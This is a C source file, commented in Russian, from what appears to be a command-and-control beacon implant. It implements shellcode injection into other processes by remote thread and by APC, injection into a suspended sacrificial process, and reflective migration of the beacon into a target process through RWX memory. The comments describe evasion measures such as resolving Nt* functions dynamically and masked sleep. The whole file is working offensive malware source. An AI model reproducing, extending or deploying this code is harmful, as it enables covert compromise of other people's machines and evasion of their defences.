// Shellcode injection commands.
//
// Поддерживается три варианта:
//   OP_INJECT_THREAD — удалённое внедрение через NtCreateThreadEx
//   OP_INJECT_APC    — удалённое внедрение через NtQueueApcThread в alertable
//                      потоки целевого процесса
//   OP_SPAWNTO       — запуск sacrificial процесса (suspended) и внедрение
//
// Был также OP_INJECT_LESS (in-proc threadless через CreateThreadpoolWait) —
// удалён, т.к. разрушал beacon из-за гонки с masked_sleep.
//
// Все Nt*-функции резолвятся через api_resolve() — без статического импорта.
// Payload — KV-блоб (см. common/co2h/kv): pid u32, sc bytes, spawn_to utf8.

#include "../core/beacon.h"
#include "../loader/loader.h"
#include "../loader/migrate.h"

// ---- helpers --------------------------------------------------------------

static void werr(const char* m) { out_write(m, rt_strlen(m)); }

// Достаёт u32 LE из KV; на провал возвращает 0.
static uint32_t kv_u32(const BeaconTask* t, const char* key) {
    uint32_t v = 0;
    if (!t || !t->pay) return 0;
    kv_get_u32(t->pay, t->pay_len, key, &v);
    return v;
}

// Возвращает указатель на bytes-поле и его длину.
static const uint8_t* kv_bytes(const BeaconTask* t, const char* key, uint32_t* out_len) {
    const uint8_t* p = NULL; uint32_t n = 0;
    if (!t || !t->pay) { *out_len = 0; return NULL; }
    if (!kv_find(t->pay, t->pay_len, key, &p, &n)) { *out_len = 0; return NULL; }
    *out_len = n;
    return p;
}

// ---- OP_INJECT_THREAD (через kit_inject) ---------------------------------

void cmd_inject_thread(const BeaconTask* t) {
    DWORD pid = (DWORD)kv_u32(t, "pid");
    uint32_t sc_len = 0;
    const uint8_t* sc = kv_bytes(t, "sc", &sc_len);
    if (!pid || !sc || !sc_len) { werr("usage: inject_thread <pid> <sc>\n"); return; }

    HANDLE hp = nt_open_process(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, pid);
    if (!hp) { werr("NtOpenProcess failed\n"); return; }

    HANDLE hth = NULL; HANDLE hproc = NULL; void* rbase = NULL;
    uint32_t rc = kit_inject(hp, pid, 0 /* THREAD */,
                             sc, sc_len, NULL, 0,
                             &hth, &hproc, &rbase);
    if (rc != 0) { CloseHandle(hp); werr("inject failed\n"); return; }
    if (hth) CloseHandle(hth);
    CloseHandle(hp);
    werr("injected via kit (thread)\n");
}

// ---- OP_INJECT_APC (через kit_inject) ------------------------------------

void cmd_inject_apc(const BeaconTask* t) {
    DWORD pid = (DWORD)kv_u32(t, "pid");
    uint32_t sc_len = 0;
    const uint8_t* sc = kv_bytes(t, "sc", &sc_len);
    if (!pid || !sc || !sc_len) { werr("usage: inject_apc <pid> <sc>\n"); return; }

    HANDLE hp = nt_open_process(PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
                                PROCESS_QUERY_INFORMATION, pid);
    if (!hp) { werr("NtOpenProcess failed\n"); return; }

    HANDLE hth = NULL; HANDLE hproc = NULL; void* rbase = NULL;
    uint32_t rc = kit_inject(hp, pid, 1 /* APC */,
                             sc, sc_len, NULL, 0,
                             &hth, &hproc, &rbase);
    CloseHandle(hp);
    if (rc != 0) { werr("inject APC failed\n"); return; }
    if (hth) CloseHandle(hth);
    werr("injected via kit (APC)\n");
}


// ---- OP_SPAWNTO (через kit_inject) ---------------------------------------
//
// payload KV: spawn_to (utf8, опционально), sc (bytes).
// Если spawn_to пустой — берётся из BeaconState.spawn_to.

void cmd_spawnto(const BeaconTask* t) {
    uint32_t sc_len = 0;
    const uint8_t* sc = kv_bytes(t, "sc", &sc_len);
    if (!sc || !sc_len) { werr("usage: spawnto <sc>\n"); return; }

    char st_a[260]; uint32_t st_len = 0;
    const uint8_t* st = kv_bytes(t, "spawn_to", &st_len);
    if (st && st_len && st_len < sizeof(st_a)) {
        rt_memcpy(st_a, st, st_len); st_a[st_len] = 0;
    } else {
        // Fallback из BeaconState (utf-8 в spawn_to).
        BeaconState* bs = beacon_state();
        size_t i = 0;
        while (i < sizeof(st_a) - 1 && bs->spawn_to[i]) {
            st_a[i] = (char)bs->spawn_to[i]; ++i;
        }
        st_a[i] = 0;
        if (!i) {
            const char def[] = "C:\\Windows\\System32\\notepad.exe";
            for (size_t j = 0; j < sizeof(def); ++j) st_a[j] = def[j];
        }
    }

    // Конвертируем spawn_to в UTF-16LE для kit_inject.
    wchar_t cmd_w[260];
    int wn = MultiByteToWideChar(CP_UTF8, 0, st_a, -1, cmd_w, 260);
    if (wn <= 0) { werr("bad spawn_to\n"); return; }

    HANDLE hth = NULL; HANDLE hproc = NULL; void* rbase = NULL;
    uint32_t rc = kit_inject(NULL, 0, 2 /* SPAWN */,
                             sc, sc_len,
                             (const uint16_t*)cmd_w, (uint32_t)wn,
                             &hth, &hproc, &rbase);
    if (rc != 0) { werr("spawn inject failed\n"); return; }
    if (hth)  CloseHandle(hth);
    if (hproc) CloseHandle(hproc);

    const char ok[] = "spawned and injected: ";
    out_write(ok, sizeof(ok) - 1);
    out_write(st_a, rt_strlen(st_a));
    out_write("\n", 1);
}

// ---- OP_MIGRATE ----------------------------------------------------------
//
// Рефлективная миграция beacon'а в чужой процесс.
//
// Логика идентична injector.c из папки loader:
//   1. Находим секцию .rldr в собственном PE (содержит Co2H_ReflectiveLoader
//      вместе со всеми хелперами — rl_memcpy, find_module_by_name и т.д.).
//   2. Вычисляем entry_offset = Co2H_ReflectiveLoader - начало секции.
//   3. Читаем сырой PE с диска.
//   4. Аллоцируем в целевом процессе RWX-блок:
//        [.rldr section | LOADER_PARAM | raw PE]
//   5. Пишем все три части.
//   6. Запускаем поток на remote_section + entry_offset, аргумент = LOADER_PARAM*.

void cmd_migrate(const BeaconTask* t) {
    DWORD pid = (DWORD)kv_u32(t, "pid");
    if (!pid) { werr("migrate: pid required\n"); return; }

    // Если уже мигрировали — контекст загрузчика лежит в env "__RL_CTX".
    // Используем MigrateToProcess, который читает raw_pe прямо из памяти.
    char rl_ctx_buf[32];
    if (GetEnvironmentVariableA("__RL_CTX", rl_ctx_buf, sizeof(rl_ctx_buf))) {
        if (MigrateToProcess(pid)) {
            werr("migrate: chain inject ok, exiting\n");
        } else {
            werr("migrate: chain inject failed\n");
        }
        out_flush_chunk(get_transport(), 1);
        Sleep(3000);
        ExitProcess(0);
    }

    // Первая миграция — читаем PE с диска, находим секцию .rldr.
    HMODULE hself = NULL;
    GetModuleHandleExW(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (LPCWSTR)(void*)cmd_migrate, &hself);
    if (!hself) { werr("migrate: GetModuleHandleEx failed\n"); return; }

    BYTE* base = (BYTE*)hself;
    IMAGE_DOS_HEADER*    self_dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS*    self_nt  = (IMAGE_NT_HEADERS*)(base + self_dos->e_lfanew);
    IMAGE_SECTION_HEADER* self_sec = IMAGE_FIRST_SECTION(self_nt);

    // ".rldr" — 5 символов + 3 нуля, итого 8 байт.
    static const char rldr_name[8] = {'.','r','l','d','r',0,0,0};
    BYTE*  loader_section = NULL;
    SIZE_T loader_size    = 0;
    for (WORD i = 0; i < self_nt->FileHeader.NumberOfSections; i++) {
        if (rt_memcmp(self_sec[i].Name, rldr_name, 8) == 0) {
            loader_section = base + self_sec[i].VirtualAddress;
            loader_size    = self_sec[i].Misc.VirtualSize
                           ? self_sec[i].Misc.VirtualSize
                           : self_sec[i].SizeOfRawData;
            break;
        }
    }
    if (!loader_section || !loader_size) {
        werr("migrate: .rldr section not found\n"); return;
    }

    // Смещение Co2H_ReflectiveLoader внутри секции.
    SIZE_T entry_offset = (SIZE_T)((BYTE*)Co2H_ReflectiveLoader - loader_section);
    if (entry_offset >= loader_size) {
        werr("migrate: loader not inside .rldr\n"); return;
    }

    // Читаем сырой PE с диска.
    wchar_t path[MAX_PATH]; path[0] = 0;
    GetModuleFileNameW(hself, path, MAX_PATH);
    if (!path[0]) { werr("migrate: no file path\n"); return; }

    HANDLE hf = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { werr("migrate: open file failed\n"); return; }

    DWORD file_size = GetFileSize(hf, NULL);
    if (file_size == INVALID_FILE_SIZE || !file_size || file_size > 32u*1024u*1024u) {
        CloseHandle(hf); werr("migrate: bad file size\n"); return;
    }

    uint8_t* raw = (uint8_t*)bmalloc(file_size);
    if (!raw) { CloseHandle(hf); werr("migrate: alloc failed\n"); return; }

    DWORD rd = 0;
    if (!ReadFile(hf, raw, file_size, &rd, NULL) || rd != file_size) {
        CloseHandle(hf); bfree(raw); werr("migrate: read failed\n"); return;
    }
    CloseHandle(hf);

    // Тип PE: DLL=0, EXE=1.
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)raw;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(raw + dos->e_lfanew);
    DWORD flags = (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) ? 0 : 1;

    // Раскладка удалённого блока: [.rldr | LOADER_PARAM | raw PE].
    SIZE_T param_off = loader_size;
    SIZE_T pe_off    = param_off + sizeof(LOADER_PARAM);
    SIZE_T total     = pe_off + file_size;

    HANDLE hp = nt_open_process(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, pid);
    if (!hp) { bfree(raw); werr("migrate: NtOpenProcess failed\n"); return; }

    PVOID  remote_block = NULL;
    SIZE_T total_sz     = total;
    NTSTATUS ns = NtAllocateVirtualMemory_i(hp, &remote_block, 0, &total_sz,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_EXECUTE_READWRITE);
    if (ns < 0 || !remote_block) {
        CloseHandle(hp); bfree(raw); werr("migrate: VirtualAlloc failed\n"); return;
    }

    // Write loader section, raw PE, and LOADER_PARAM into remote block.
    if (!nt_write(hp, remote_block, loader_section, loader_size)) {
        CloseHandle(hp); bfree(raw); werr("migrate: write loader failed\n"); return;
    }

    if (!nt_write(hp, (BYTE*)remote_block + pe_off, raw, file_size)) {
        CloseHandle(hp); bfree(raw); werr("migrate: write pe failed\n"); return;
    }
    bfree(raw);

    LOADER_PARAM lp;
    lp.raw_pe              = (PVOID)((BYTE*)remote_block + pe_off);
    lp.raw_pe_size         = file_size;
    lp.flags               = flags;
    lp.out_module_base     = NULL;
    lp.loader_section      = (PVOID)remote_block;
    lp.loader_section_size = (DWORD)loader_size;
    lp.entry_offset        = (DWORD)entry_offset;
    if (!nt_write(hp, (BYTE*)remote_block + param_off, &lp, sizeof(lp))) {
        CloseHandle(hp); werr("migrate: write param failed\n"); return;
    }

    // Поток стартует на Co2H_ReflectiveLoader внутри скопированной секции.
    PVOID entry = (BYTE*)remote_block + entry_offset;
    PVOID arg   = (BYTE*)remote_block + param_off;

    HANDLE hth = nt_create_thread(hp, entry, arg);
    if (!hth) { CloseHandle(hp); werr("migrate: NtCreateThreadEx failed\n"); return; }

    CloseHandle(hth);
    CloseHandle(hp);

    werr("migrate: reflective inject ok, exiting\n");
    out_flush_chunk(get_transport(), 1);
    Sleep(3000);
    ExitProcess(0);
}
